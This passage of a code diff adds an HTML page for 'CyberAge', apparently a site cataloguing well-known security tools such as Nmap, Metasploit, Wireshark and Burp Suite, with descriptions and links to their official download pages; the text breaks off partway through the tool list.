@@ -1,0 +1,949 @@
+<!doctypehtml><html lang=en><meta charset=UTF-8><meta content="width=device-width,initial-scale=1"name=viewport><title>CyberAge - Download Cybersecurity Utilities</title><link href=https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css rel=stylesheet><style>*{margin:0;padding:0;box-sizing:border-box;font-family:'Courier New',monospace}body{background-color:#0a0a1a;color:#fff;overflow-x:hidden;position:relative}.container{max-width:1200px;margin:0 auto;padding:0 20px;position:relative;z-index:1}.particles{position:fixed;top:0;left:0;width:100%;height:100%;z-index:0;background:radial-gradient(circle at center,#0a0a1a 0,#000 100%);overflow:hidden}.particles::before{content:"";position:absolute;top:0;left:0;width:100%;height:100%;background:linear-gradient(90deg,#0a0a1a 21px,transparent 1%) center,linear-gradient(#0a0a1a 21px,transparent 1%) center,#00f7ff;background-size:22px 22px;opacity:.05}.glow-text{text-shadow:0 0 10px #00f7ff,0 0 20px #00f7ff}.pink-text{color:#f0a;text-shadow:0 0 5px #f0a}.green-text{color:#00ff47;text-shadow:0 0 5px #00ff47}.cyan-text{color:#00f7ff;text-shadow:0 0 5px #00f7ff}.red-text{color:#f03;text-shadow:0 0 5px #f03}.navbar{display:flex;justify-content:space-between;align-items:center;padding:20px 0;position:relative;z-index:10}.logo{font-size:1.8rem;font-weight:700;letter-spacing:2px;transition:all .3s ease}.logo:hover{transform:scale(1.05)}.nav-links{display:flex;list-style:none;gap:30px}.nav-link{color:#fff;text-decoration:none;font-size:1rem;position:relative;padding:5px 0;transition:all .3s ease}.nav-link::after{content:'';position:absolute;bottom:0;left:0;width:0;height:2px;background-color:#00f7ff;transition:width .3s ease}.nav-link:hover::after{width:100%}.nav-link.active{color:#00f7ff}.auth-buttons{display:flex;gap:15px}.btn-login,.btn-signup{padding:8px 20px;border-radius:4px;font-weight:700;cursor:pointer;transition:all .3s ease}.btn-login{background:0 0;border:1px solid #00f7ff;color:#00f7ff}.btn-signup{background:#00f7ff;border:1px solid #00f7ff;color:#0a0a1a}.btn-login:hover{background:rgba(0,247,255,.1);transform:translateY(-2px)}.btn-signup:hover{background:#00d9e6;border-color:#00d9e6;transform:translateY(-2px)}.hamburger{display:none;cursor:pointer;flex-direction:column;gap:5px}.hamburger .line{width:25px;height:2px;background-color:#fff;transition:all .3s ease}.hero{display:flex;align-items:center;min-height:80vh;padding:60px 0;position:relative}.hero-content{flex:1;padding-right:40px;animation:fadeInLeft 1s ease}.hero-image{flex:1;position:relative;animation:fadeInRight 1s ease}.hero-title{font-size:3.5rem;margin-bottom:20px;line-height:1.2}.hero-subtitle{font-size:1.2rem;color:#aaa;margin-bottom:30px;line-height:1.6}.search-container{display:flex;margin-bottom:40px;max-width:600px;position:relative}.search-input{flex:1;padding:15px 20px;background:rgba(0,0,0,.5);border:1px solid #334;border-right:none;color:#fff;font-size:1rem;border-radius:4px 0 0 4px;outline:0;transition:all .3s ease}.search-input:focus{border-color:#00f7ff;box-shadow:0 0 15px rgba(0,247,255,.3)}.search-btn{padding:0 25px;background:#00f7ff;color:#0a0a1a;border:none;border-radius:0 4px 4px 0;cursor:pointer;font-size:1.2rem;transition:all .3s ease}.search-btn:hover{background:#00d9e6;transform:scale(1.05)}.stats{display:flex;gap:30px}.stat-item{display:flex;flex-direction:column;transition:all .3s ease}.stat-item:hover{transform:translateY(-5px)}.stat-number{font-size:2rem;font-weight:700;margin-bottom:5px}.stat-label{font-size:.9rem;color:#aaa}.terminal-window{background:rgba(0,0,0,.7);border:1px solid #00f7ff;border-radius:8px;overflow:hidden;box-shadow:0 0 20px rgba(0,247,255,.3);max-width:500px;margin-left:auto;transition:all .3s ease}.terminal-window:hover{transform:translateY(-5px);box-shadow:0 0 30px rgba(0,247,255,.5)}.terminal-header{background:rgba(0,247,255,.1);padding:10px 15px;display:flex;align-items:center;border-bottom:1px solid #00f7ff}.terminal-buttons{display:flex;gap:8px;margin-right:15px}.terminal-btn{width:12px;height:12px;border-radius:50%;transition:all .3s ease}.terminal-btn:hover{transform:scale(1.2)}.terminal-btn.red{background:#f03}.terminal-btn.yellow{background:#fc0}.terminal-btn.green{background:#00ff47}.terminal-title{font-size:.9rem;color:#00f7ff}.terminal-body{padding:20px;font-family:'Courier New',monospace;line-height:1.6}.terminal-line{margin-bottom:10px}.blinking{animation:blink 1s infinite}@keyframes blink{0%,100%{opacity:1}50%{opacity:0}}section{padding:80px 0;position:relative}.section-title{font-size:2.5rem;margin-bottom:50px;text-align:center;position:relative;display:inline-block}.section-title::after{content:'';position:absolute;bottom:-10px;left:50%;transform:translateX(-50%);width:80px;height:3px;background:#00f7ff;border-radius:3px}.filter-buttons{display:flex;justify-content:center;gap:15px;margin-bottom:40px;flex-wrap:wrap}.filter-btn{padding:8px 20px;background:0 0;border:1px solid #334;color:#fff;border-radius:20px;cursor:pointer;transition:all .3s ease}.filter-btn.active,.filter-btn:hover{background:#00f7ff;border-color:#00f7ff;color:#0a0a1a;transform:translateY(-3px)}.tools-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(300px,1fr));gap:25px;margin-bottom:40px}.tool-card{background:rgba(10,10,26,.8);border:1px solid #334;border-radius:8px;padding:25px;transition:all .3s ease;position:relative;overflow:hidden;cursor:pointer}.tool-card:hover{border-color:#00f7ff;box-shadow:0 0 20px rgba(0,247,255,.2);transform:translateY(-5px)}.tool-card::before{content:'';position:absolute;top:0;left:0;width:100%;height:100%;background:linear-gradient(135deg,rgba(0,247,255,.1) 0,transparent 100%);z-index:-1}.tool-image{width:100%;height:150px;object-fit:contain;margin-bottom:15px;border-radius:4px;background:rgba(0,0,0,.3);padding:10px}.tool-header{display:flex;justify-content:space-between;align-items:center;margin-bottom:15px}.tool-name{font-size:1.3rem;font-weight:700;color:#00f7ff}.tool-badge{padding:3px 10px;border-radius:4px;font-size:.8rem;font-weight:700}.badge-free{background:rgba(0,255,71,.2);color:#00ff47;border:1px solid #00ff47}.badge-pro{background:rgba(255,0,170,.2);color:#f0a;border:1px solid #f0a}.tool-desc{color:#aaa;margin-bottom:20px;line-height:1.5}.tool-meta{display:flex;justify-content:space-between;margin-bottom:20px;font-size:.9rem}.tool-category{color:#00f7ff}.tool-rating{color:#fc0}.tool-download{width:100%;padding:10px;background:#00f7ff;color:#0a0a1a;border:none;border-radius:4px;font-weight:700;cursor:pointer;transition:all .3s ease}.tool-download:hover{background:#00d9e6;transform:translateY(-2px);box-shadow:0 5px 15px rgba(0,247,255,.3)}.btn-load-more{display:block;margin:0 auto;padding:12px 30px;background:0 0;border:1px solid #00f7ff;color:#00f7ff;border-radius:4px;font-weight:700;cursor:pointer;transition:all .3s ease}.btn-load-more:hover{background:rgba(0,247,255,.1);transform:translateY(-3px);box-shadow:0 5px 15px rgba(0,247,255,.2)}.categories-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(250px,1fr));gap:25px}.category-card{background:rgba(10,10,26,.8);border:1px solid #334;border-radius:8px;padding:30px;text-align:center;transition:all .3s ease}.category-card:hover{border-color:#00f7ff;box-shadow:0 0 20px rgba(0,247,255,.2);transform:translateY(-5px)}.category-icon{font-size:2.5rem;color:#00f7ff;margin-bottom:20px;transition:all .3s ease}.category-card:hover .category-icon{transform:scale(1.2) rotate(10deg)}.category-title{font-size:1.3rem;margin-bottom:15px;color:#fff}.category-desc{color:#aaa;margin-bottom:15px;line-height:1.5}.category-count{color:#00f7ff;font-size:.9rem}.about-section{display:flex;align-items:center;gap:50px}.about-content{flex:1;animation:fadeInLeft 1s ease}.about-image{flex:1;position:relative;height:400px;animation:fadeInRight 1s ease}.about-text{color:#aaa;margin-bottom:20px;line-height:1.6}.about-features{margin-top:30px}.feature-item{display:flex;align-items:center;gap:10px;margin-bottom:15px;color:#fff;transition:all .3s ease}.feature-item:hover{transform:translateX(10px)}.hexagon{position:absolute;width:150px;height:173px;background:rgba(0,247,255,.1);clip-path:polygon(50% 0,100% 25%,100% 75%,50% 100%,0 75%,0 25%);border:1px solid #00f7ff;transition:all .5s ease}.hexagon:nth-child(1){top:0;left:50%;transform:translateX(-50%)}.hexagon:nth-child(2){bottom:0;left:0}.hexagon:nth-child(3){bottom:0;right:0}.about-image:hover .hexagon:nth-child(1){transform:translateX(-50%) rotate(15deg)}.about-image:hover .hexagon:nth-child(2){transform:rotate(-15deg)}.about-image:hover .hexagon:nth-child(3){transform:rotate(15deg)}.footer{background:rgba(0,0,0,.5);padding:60px 0 30px;border-top:1px solid #334}.footer-content{display:grid;grid-template-columns:repeat(auto-fit,minmax(200px,1fr));gap:40px;margin-bottom:40px}.footer-title{font-size:1.2rem;color:#00f7ff;margin-bottom:20px;position:relative;display:inline-block}.footer-title::after{content:'';position:absolute;bottom:-5px;left:0;width:40px;height:2px;background:#00f7ff}.footer-text{color:#aaa;margin-bottom:20px;line-height:1.6}.social-links{display:flex;gap:15px}.social-links a{color:#fff;font-size:1.2rem;transition:all .3s ease}.social-links a:hover{color:#00f7ff;transform:translateY(-3px)}.footer-links{list-style:none}.footer-links li{margin-bottom:10px;transition:all .3s ease}.footer-links li:hover{transform:translateX(5px)}.footer-links a{color:#aaa;text-decoration:none;transition:color .3s ease}.footer-links a:hover{color:#00f7ff}.copyright{text-align:center;color:#667;padding-top:30px;border-top:1px solid #334}.modal-overlay{position:fixed;top:0;left:0;right:0;bottom:0;background:rgba(0,0,0,.8);display:flex;justify-content:center;align-items:center;z-index:1000;opacity:0;visibility:hidden;transition:all .3s ease}.modal-overlay.active{opacity:1;visibility:visible}.modal-container{background:rgba(10,10,26,.95);border:1px solid #00f7ff;border-radius:8px;width:90%;max-width:800px;max-height:90vh;overflow-y:auto;box-shadow:0 0 30px rgba(0,247,255,.5);transform:scale(.9);transition:all .3s ease;position:relative}.modal-overlay.active .modal-container{transform:scale(1)}.modal-header{display:flex;justify-content:space-between;align-items:center;padding:20px;border-bottom:1px solid #334;position:sticky;top:0;background:rgba(10,10,26,.95);z-index:10}.modal-title{font-size:1.8rem;color:#00f7ff;display:flex;align-items:center;gap:10px}.modal-close{background:0 0;border:none;color:#fff;font-size:1.5rem;cursor:pointer;transition:all .3s ease}.modal-close:hover{color:#f03;transform:rotate(90deg)}.modal-body{padding:20px}.modal-section{margin-bottom:30px}.modal-section-title{font-size:1.3rem;color:#00f7ff;margin-bottom:15px;display:flex;align-items:center;gap:10px}.modal-section-title i{font-size:1.2rem}.modal-features{display:grid;grid-template-columns:repeat(auto-fill,minmax(200px,1fr));gap:15px;margin-bottom:20px}.feature-tag{background:rgba(0,247,255,.1);border:1px solid #00f7ff;padding:8px 15px;border-radius:20px;font-size:.9rem;text-align:center}.modal-desc{color:#aaa;line-height:1.6;margin-bottom:20px}.requirements-list{list-style-type:none}.requirements-list li{margin-bottom:10px;padding-left:25px;position:relative}.requirements-list li::before{content:'•';color:#00f7ff;font-size:1.5rem;position:absolute;left:5px;top:-5px}.os-compatibility{display:flex;gap:15px;flex-wrap:wrap}.os-tag{padding:8px 15px;border-radius:4px;font-size:.9rem;display:flex;align-items:center;gap:8px}.os-tag.windows{background:rgba(0,117,255,.1);border:1px solid #0075ff;color:#0075ff}.os-tag.linux{background:rgba(255,140,0,.1);border:1px solid #ff8c00;color:#ff8c00}.os-tag.mac{background:rgba(179,179,179,.1);border:1px solid #b3b3b3;color:#b3b3b3}.download-options{display:grid;grid-template-columns:repeat(auto-fill,minmax(150px,1fr));gap:15px}.download-btn{padding:10px;border-radius:4px;text-align:center;cursor:pointer;transition:all .3s ease;display:flex;flex-direction:column;align-items:center;gap:5px}.download-btn i{font-size:1.5rem}.download-btn.windows{background:rgba(0,117,255,.1);border:1px solid #0075ff;color:#0075ff}.download-btn.linux{background:rgba(255,140,0,.1);border:1px solid #ff8c00;color:#ff8c00}.download-btn.mac{background:rgba(179,179,179,.1);border:1px solid #b3b3b3;color:#b3b3b3}.download-btn.source{background:rgba(0,247,255,.1);border:1px solid #00f7ff;color:#00f7ff}.download-btn:hover{transform:translateY(-3px);box-shadow:0 5px 15px rgba(0,247,255,.2)}.license-section{background:rgba(0,247,255,.05);border:1px solid #00f7ff;border-radius:8px;padding:20px;margin-top:30px}.license-text{color:#aaa;margin-bottom:15px;line-height:1.6}.btn-get-license{padding:10px 20px;background:#00f7ff;color:#0a0a1a;border:none;border-radius:4px;font-weight:700;cursor:pointer;transition:all .3s ease;display:inline-flex;align-items:center;gap:8px}.btn-get-license:hover{background:#00d9e6;transform:translateY(-2px);box-shadow:0 5px 15px rgba(0,247,255,.3)}.code-section{background:rgba(10,10,26,.8);border:1px solid #334;border-radius:8px;padding:30px;margin-bottom:30px}.code-header{display:flex;justify-content:space-between;align-items:center;margin-bottom:20px}.code-title{font-size:1.5rem;color:#00f7ff}.code-meta{display:flex;gap:15px}.code-author{color:#aaa}.code-date{color:#667}.code-content{background:#000;border:1px solid #334;border-radius:4px;padding:20px;overflow-x:auto;margin-bottom:20px}.code-description{color:#aaa;margin-bottom:20px;line-height:1.6}.code-tags{display:flex;gap:10px;flex-wrap:wrap}.code-tag{background:rgba(0,247,255,.1);border:1px solid #00f7ff;padding:5px 10px;border-radius:4px;font-size:.8rem}.code-actions{display:flex;gap:15px}.code-btn{padding:8px 15px;border-radius:4px;font-weight:700;cursor:pointer;transition:all .3s ease}.code-btn.copy{background:rgba(0,247,255,.1);border:1px solid #00f7ff;color:#00f7ff}.code-btn.download{background:#00f7ff;border:1px solid #00f7ff;color:#0a0a1a}.code-btn.edit{background:rgba(255,0,170,.1);border:1px solid #f0a;color:#f0a}.code-btn:hover{transform:translateY(-2px)}.code-btn.copy:hover{background:rgba(0,247,255,.2)}.code-btn.download:hover{background:#00d9e6;border-color:#00d9e6}.code-btn.edit:hover{background:rgba(255,0,170,.2)}.code-cards-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(300px,1fr));gap:25px;margin-bottom:40px}.code-card{background:rgba(10,10,26,.8);border:1px solid #334;border-radius:8px;padding:25px;transition:all .3s ease;position:relative;overflow:hidden;cursor:pointer}.code-card:hover{border-color:#00f7ff;box-shadow:0 0 20px rgba(0,247,255,.2);transform:translateY(-5px)}.code-card::before{content:'';position:absolute;top:0;left:0;width:100%;height:100%;background:linear-gradient(135deg,rgba(0,247,255,.1) 0,transparent 100%);z-index:-1}.code-card-image{width:100%;height:150px;object-fit:cover;margin-bottom:15px;border-radius:4px;background:rgba(0,0,0,.3)}.code-card-header{display:flex;justify-content:space-between;align-items:center;margin-bottom:15px}.code-card-name{font-size:1.3rem;font-weight:700;color:#00f7ff}.code-card-badge{padding:3px 10px;border-radius:4px;font-size:.8rem;font-weight:700}.badge-python{background:rgba(53,114,165,.2);color:#3572a5;border:1px solid #3572a5}.badge-js{background:rgba(241,224,90,.2);color:#f1e05a;border:1px solid #f1e05a}.badge-shell{background:rgba(137,224,81,.2);color:#89e051;border:1px solid #89e051}.code-card-desc{color:#aaa;margin-bottom:20px;line-height:1.5}.code-card-meta{display:flex;justify-content:space-between;margin-bottom:20px;font-size:.9rem}.code-card-category{color:#00f7ff}.code-card-rating{color:#fc0}.code-card-view{width:100%;padding:10px;background:#00f7ff;color:#0a0a1a;border:none;border-radius:4px;font-weight:700;cursor:pointer;transition:all .3s ease}.code-card-view:hover{background:#00d9e6;transform:translateY(-2px);box-shadow:0 5px 15px rgba(0,247,255,.3)}.code-modal-content{background:#000;border:1px solid #334;border-radius:4px;padding:20px;overflow-x:auto;font-family:'Courier New',monospace;line-height:1.6;white-space:pre-wrap;margin-bottom:20px}@keyframes fadeInLeft{from{opacity:0;transform:translateX(-50px)}to{opacity:1;transform:translateX(0)}}@keyframes fadeInRight{from{opacity:0;transform:translateX(50px)}to{opacity:1;transform:translateX(0)}}@keyframes pulse{0%{transform:scale(1)}50%{transform:scale(1.05)}100%{transform:scale(1)}}.pulse{animation:pulse 2s infinite}@media (max-width:992px){.hero{flex-direction:column;text-align:center}.hero-content{padding-right:0;margin-bottom:50px;animation:fadeInUp 1s ease}.hero-image{animation:fadeInUp 1s ease}.search-container{margin-left:auto;margin-right:auto}.stats{justify-content:center}.terminal-window{margin:0 auto}.about-section{flex-direction:column}.about-image{margin-top:50px}@keyframes fadeInUp{from{opacity:0;transform:translateY(50px)}to{opacity:1;transform:translateY(0)}}}@media (max-width:768px){.auth-buttons,.nav-links{display:none}.hamburger{display:flex}.hero-title{font-size:2.5rem}.section-title{font-size:2rem}.modal-features{grid-template-columns:repeat(auto-fill,minmax(150px,1fr))}.code-actions{flex-direction:column}}@media (max-width:576px){.hero-title{font-size:2rem}.stats{flex-direction:column;gap:20px}.filter-buttons{gap:10px}.filter-btn{padding:6px 15px;font-size:.9rem}.modal-title{font-size:1.5rem}.modal-section-title{font-size:1.1rem}.download-options{grid-template-columns:1fr}.code-header{flex-direction:column;align-items:flex-start;gap:10px}.code-meta{flex-direction:column;gap:5px}}</style><div class=particles></div><div class=container><nav class=navbar><div class=logo><span class=glow-text>CYBER</span><span class=pink-text>AGE</span></div><ul class=nav-links><li><a href=#home class="nav-link active">Home</a><li><a href=#tools class=nav-link>Tools</a><li><a href=#categories class=nav-link>Categories</a><li><a href=#code class=nav-link>Code</a><li><a href=#about class=nav-link>About</a></ul><div class=auth-buttons><button class=btn-login>Login</button> <button class=btn-signup>Sign Up</button></div><div class=hamburger><div class=line></div><div class=line></div><div class=line></div></div></nav><section class=hero id=home><div class=hero-content><h1 class=hero-title><span class=glow-text>DOWNLOAD</span> <span class=pink-text>CYBERSECURITY</span> <span class=green-text>TOOLS</span></h1><p class=hero-subtitle>Access the most powerful security utilities for penetration testing, network analysis, and digital forensics<div class=search-container><input class=search-input id=searchInput placeholder="Search tools..."> <button class=search-btn id=searchBtn><i class="fas fa-search"></i></button></div><div class=stats><div class=stat-item><span class="pink-text stat-number">500+</span> <span class=stat-label>Tools Available</span></div><div class=stat-item><span class="green-text stat-number">10K+</span> <span class=stat-label>Daily Downloads</span></div><div class=stat-item><span class="stat-number cyan-text">100%</span> <span class=stat-label>Open Source</span></div></div></div><div class=hero-image><div class=terminal-window><div class=terminal-header><div class=terminal-buttons><span class="terminal-btn red"></span> <span class="terminal-btn yellow"></span> <span class="terminal-btn green"></span></div><span class=terminal-title>root@cyberage:~</span></div><div class=terminal-body><p class=terminal-line><span class=cyan-text>$</span> sudo apt-get install cyberage-tools<p class=terminal-line>Accessing repository...<p class=terminal-line>Downloading tools...<p class="terminal-line blinking">>_</div></div></div></section><section class=tools-section id=tools><h2 class=section-title><span class=glow-text>FEATURED</span> <span class=pink-text>TOOLS</span></h2><div class=filter-buttons><button class="filter-btn active"data-category=all>All</button> <button class=filter-btn data-category="Penetration Testing">Penetration Testing</button> <button class=filter-btn data-category="Network Analysis">Network Analysis</button> <button class=filter-btn data-category=Forensics>Forensics</button> <button class=filter-btn data-category="Password Cracking">Password Cracking</button> <button class=filter-btn data-category="Discord Tool">Discord Tool</button></div><div class=tools-grid id=toolsGrid></div><button class=btn-load-more>Load More Tools</button></section><section class=categories-section id=categories><h2 class=section-title><span class=glow-text>TOOL</span> <span class=green-text>CATEGORIES</span></h2><div class=categories-grid><div class=category-card><div class=category-icon><i class="fas fa-shield-alt"></i></div><h3 class=category-title>Penetration Testing</h3><p class=category-desc>Tools for vulnerability assessment and exploitation</p><span class=category-count>120 tools</span></div><div class=category-card><div class=category-icon><i class="fas fa-network-wired"></i></div><h3 class=category-title>Network Analysis</h3><p class=category-desc>Packet sniffers and protocol analyzers</p><span class=category-count>85 tools</span></div><div class=category-card><div class=category-icon><i class="fas fa-search"></i></div><h3 class=category-title>Digital Forensics</h3><p class=category-desc>Incident response and investigation tools</p><span class=category-count>65 tools</span></div><div class=category-card><div class=category-icon><i class="fas fa-key"></i></div><h3 class=category-title>Password Cracking</h3><p class=category-desc>Hash crackers and brute-force utilities</p><span class=category-count>42 tools</span></div></div></section><section id=code><h2 class=section-title><span class=glow-text>SECURITY</span> <span class=cyan-text>CODE SNIPPETS</span></h2><div class=filter-buttons><button class="filter-btn active"data-category=all>All</button> <button class=filter-btn data-category=Python>Python</button> <button class=filter-btn data-category=JavaScript>JavaScript</button> <button class=filter-btn data-category="Shell Script">Shell Script</button> <button class=filter-btn data-category="Network Security">Network Security</button> <button class=filter-btn data-category="Web Security">Web Security</button></div><div class=code-cards-grid id=codeCardsGrid></div><button class=btn-load-more>Load More Code</button></section><section class=about-section id=about><div class=about-content><h2 class=section-title><span class=glow-text>ABOUT</span> <span class=pink-text>CYBER AGE</span></h2><p class=about-text>CyberAge is the premier repository for cybersecurity professionals and enthusiasts. We curate the most powerful and up-to-date security tools from around the web, providing a centralized platform for discovery and download.<p class=about-text>Our mission is to support the cybersecurity community by making essential tools easily accessible while promoting ethical hacking practices.<div class=about-features><div class=feature-item><i class="fas fa-check-circle green-text"></i> <span>Verified downloads</span></div><div class=feature-item><i class="fas fa-check-circle green-text"></i> <span>Malware-free guarantee</span></div><div class=feature-item><i class="fas fa-check-circle green-text"></i> <span>Regular updates</span></div></div></div><div class=about-image><div class=hexagon></div><div class=hexagon></div><div class=hexagon></div></div></section><footer class=footer><div class=footer-content><div class=footer-section><h3 class=footer-title>CyberAge</h3><p class=footer-text>The ultimate destination for cybersecurity tools and resources.<div class=social-links><a href=#><i class="fab fa-github"></i></a> <a href=#><i class="fab fa-twitter"></i></a> <a href=#><i class="fab fa-discord"></i></a></div></div><div class=footer-section><h3 class=footer-title>Quick Links</h3><ul class=footer-links><li><a href=#home>Home</a><li><a href=#tools>Tools</a><li><a href=#categories>Categories</a><li><a href=#code>Code</a><li><a href=#about>About</a></ul></div><div class=footer-section><h3 class=footer-title>Legal</h3><ul class=footer-links><li><a href=#>Terms of Service</a><li><a href=#>Privacy Policy</a><li><a href=#>Ethical Guidelines</a></ul></div></div><div class=copyright><p>© 2023 CyberAge. All tools are provided for educational and authorized testing purposes only.</div></footer></div><div class=modal-overlay id=toolModal><div class=modal-container><div class=modal-header><h2 class=modal-title id=modalToolName><i class="fas fa-shield-alt"></i> <span>Tool Name</span></h2><button class=modal-close id=modalClose>×</button></div><div class=modal-body><div class=modal-section><h3 class=modal-section-title><i class="fas fa-info-circle"></i> Description</h3><p class=modal-desc id=modalToolDesc>Tool description goes here...</div><div class=modal-section><h3 class=modal-section-title><i class="fas fa-star"></i> Key Features</h3><div class=modal-features id=modalToolFeatures></div></div><div class=modal-section><h3 class=modal-section-title><i class="fas fa-cog"></i> Requirements</h3><ul class=requirements-list id=modalToolRequirements></ul></div><div class=modal-section><h3 class=modal-section-title><i class="fas fa-laptop"></i> OS Compatibility</h3><div class=os-compatibility id=modalToolOS></div></div><div class=modal-section><h3 class=modal-section-title><i class="fas fa-download"></i> Download Options</h3><div class=download-options id=modalToolDownloads></div></div><div class=license-section><h3 class=modal-section-title><i class="fas fa-key"></i> License Information</h3><p class=license-text>This tool is open-source and available under the MIT License. For commercial use or extended features, you may need a professional license.</p><button class=btn-get-license id=getLicenseBtn><i class="fas fa-key"></i> Get License Key</button></div></div></div></div><div class=modal-overlay id=codeModal><div class=modal-container><div class=modal-header><h2 class=modal-title id=modalCodeName><i class="fas fa-code"></i> <span>Code Snippet</span></h2><button class=modal-close id=modalCodeClose>×</button></div><div class=modal-body><div class=modal-section><h3 class=modal-section-title><i class="fas fa-info-circle"></i> Description</h3><p class=modal-desc id=modalCodeDesc>Code description goes here...</div><div class=modal-section><h3 class=modal-section-title><i class="fas fa-tags"></i> Tags</h3><div class=modal-features id=modalCodeTags></div></div><div class=modal-section><h3 class=modal-section-title><i class="fas fa-code"></i> Code</h3><div class=code-modal-content id=modalCodeContent></div></div><div class=modal-section><h3 class=modal-section-title><i class="fas fa-cog"></i> Requirements</h3><ul class=requirements-list id=modalCodeRequirements></ul></div><div class=modal-section><h3 class=modal-section-title><i class="fas fa-download"></i> Actions</h3><div class=code-actions><button class="code-btn copy"id=copyCodeBtn><i class="fas fa-copy"></i> Copy Code</button> <button class="code-btn download"id=downloadCodeBtn><i class="fas fa-download"></i> Download</button> <button class="code-btn edit"id=editCodeBtn><i class="fas fa-edit"></i> Edit</button></div></div></div></div></div><script>// Sample tool data with enhanced information
+        const tools = [
+            {
+                name: "Nmap",
+                description: "Network mapper for discovery and security auditing. Nmap (Network Mapper) is a free and open-source utility for network discovery and security auditing. Many systems and network administrators also find it useful for tasks such as network inventory, managing service upgrade schedules, and monitoring host or service uptime.",
+                category: "Network Analysis",
+                price: "FREE",
+                rating: "★★★★★",
+                downloads: "50K+",
+                image: "https://upload.wikimedia.org/wikipedia/commons/thumb/6/60/Nmap_Logo.png/320px-Nmap_Logo.png",
+                features: [
+                    "Host discovery",
+                    "Port scanning",
+                    "Version detection",
+                    "OS detection",
+                    "Scriptable interaction"
+                ],
+                requirements: [
+                    "1GHz processor or better",
+                    "512MB RAM",
+                    "100MB disk space",
+                    "Network interface"
+                ],
+                os: ["windows", "linux", "mac"],
+                downloadLinks: {
+                    windows: "https://nmap.org/download.html#windows",
+                    linux: "https://nmap.org/download.html#linux",
+                    mac: "https://nmap.org/download.html#macosx",
+                    source: "https://nmap.org/download.html"
+                }
+            },
+            {
+                name: "Metasploit",
+                description: "Penetration testing framework with exploit development tools. Metasploit is a penetration testing platform that enables you to find, exploit, and validate vulnerabilities. It provides the infrastructure, content, and tools to perform penetration tests and extensive security auditing.",
+                category: "Penetration Testing",
+                price: "FREE",
+                rating: "★★★★☆",
+                downloads: "45K+",
+                image: "https://www.offensive-security.com/wp-content/uploads/2015/04/metasploit-logo.png",
+                features: [
+                    "Exploit development",
+                    "Payload generation",
+                    "Post-exploitation modules",
+                    "Automated testing",
+                    "Integration with other tools"
+                ],
+                requirements: [
+                    "2GHz processor or better",
+                    "2GB RAM minimum",
+                    "1GB disk space",
+                    "Ruby 2.5+"
+                ],
+                os: ["windows", "linux"],
+                downloadLinks: {
+                    windows: "https://www.metasploit.com/download",
+                    linux: "https://www.metasploit.com/download",
+                    source: "https://github.com/rapid7/metasploit-framework"
+                }
+            },
+            {
+                name: "Wireshark",
+                description: "Network protocol analyzer for troubleshooting and analysis. Wireshark is the world's foremost and widely-used network protocol analyzer. It lets you see what's happening on your network at a microscopic level and is the de facto standard across many commercial and non-profit enterprises.",
+                category: "Discord Tool",
+                price: "FREE",
+                rating: "★★★★★",
+                downloads: "60K+",
+                image: "https://upload.wikimedia.org/wikipedia/commons/d/df/Wireshark_icon.png",
+                features: [
+                    "Deep inspection of protocols",
+                    "Live capture and offline analysis",
+                    "Standard three-pane packet browser",
+                    "Rich VoIP analysis",
+                    "Decryption support"
+                ],
+                requirements: [
+                    "1.5GHz processor",
+                    "1GB RAM",
+                    "500MB disk space",
+                    "WinPcap or libpcap"
+                ],
+                os: ["windows", "linux", "mac"],
+                downloadLinks: {
+                    windows: "https://www.wireshark.org/download.html",
+                    linux: "https://www.wireshark.org/download.html",
+                    mac: "https://www.wireshark.org/download.html",
+                    source: "https://www.wireshark.org/download.html"
+                }
+            },
+            {
+                name: "John the Ripper",
+                description: "Password cracking utility supporting multiple hash types. John the Ripper is a fast password cracker, currently available for many flavors of Unix, Windows, DOS, and OpenVMS. Its primary purpose is to detect weak Unix passwords.",
+                category: "Password Cracking",
+                price: "FREE",
+                rating: "★★★★☆",
+                downloads: "35K+",
+                image: "https://www.openwall.com/john/logo.png",
+                features: [
+                    "Multiple hash types",
+                    "Custom wordlists",
+                    "Brute-force attacks",
+                    "Dictionary attacks",
+                    "Hybrid attacks"
+                ],
+                requirements: [
+                    "Multi-core processor recommended",
+                    "2GB RAM for large wordlists",
+                    "100MB disk space",
+                    "GPU for accelerated cracking"
+                ],
+                os: ["windows", "linux", "mac"],
+                downloadLinks: {
+                    windows: "https://www.openwall.com/john/",
+                    linux: "https://www.openwall.com/john/",
+                    mac: "https://www.openwall.com/john/",
+                    source: "https://github.com/openwall/john"
+                }
+            },
+            {
+                name: "Burp Suite",
+                description: "Web application security testing platform. Burp Suite is an integrated platform for performing security testing of web applications. Its various tools work seamlessly together to support the entire testing process.",
+                category: "Penetration Testing",
+                price: "FREE",
+                rating: "★★★★★",
+                downloads: "40K+",
+                image: "https://portswigger.net/burp/favicon.ico",
+                features: [
+                    "Web vulnerability scanning",
+                    "Advanced manual tools",
+                    "Automated crawling",
+                    "Extensibility via API",
+                    "Session handling"
+                ],
+                requirements: [
+                    "2GHz processor",
+                    "4GB RAM recommended",
+                    "200MB disk space",
+                    "Java 11+"
+                ],
+                os: ["windows", "linux", "mac"],
+                downloadLinks: {
+                    windows: "https://portswigger.net/burp/communitydownload",
+                    linux: "https://portswigger.net/burp/communitydownload",
+                    mac: "https://portswigger.net/burp/communitydownload",
+                    source: "https://portswigger.net/burp/documentation/desktop/getting-started/installing"
+                }
+            },
+            {
+                name: "Autopsy",
+                description: "Digital forensics platform for incident response. Autopsy is a digital forensics platform and graphical interface to The Sleuth Kit and other digital forensics tools. It is used by law enforcement, military, and corporate examiners to investigate what happened on a computer.",
+                category: "Forensics",
+                price: "FREE",
+                rating: "★★★☆☆",
+                downloads: "25K+",
+                image: "https://www.autopsy.com/wp-content/uploads/2020/04/autopsy_logo_white.png",
+                features: [
+                    "Timeline analysis",
+                    "Keyword searching",
+                    "Registry analysis",
+                    "Web artifact analysis",
+                    "Case management"
+                ],
+                requirements: [
+                    "2GHz processor",
+                    "4GB RAM minimum",
+                    "1GB disk space",
+                    "Java 8+"
+                ],
+                os: ["windows", "linux", "mac"],
+                downloadLinks: {
+                    windows: "https://www.autopsy.com/download/",
+                    linux: "https://www.autopsy.com/download/",
+                    mac: "https://www.autopsy.com/download/",
+                    source: "https://github.com/sleuthkit/autopsy"
+                }
+            },
+            {
+                name: "Aircrack-ng",
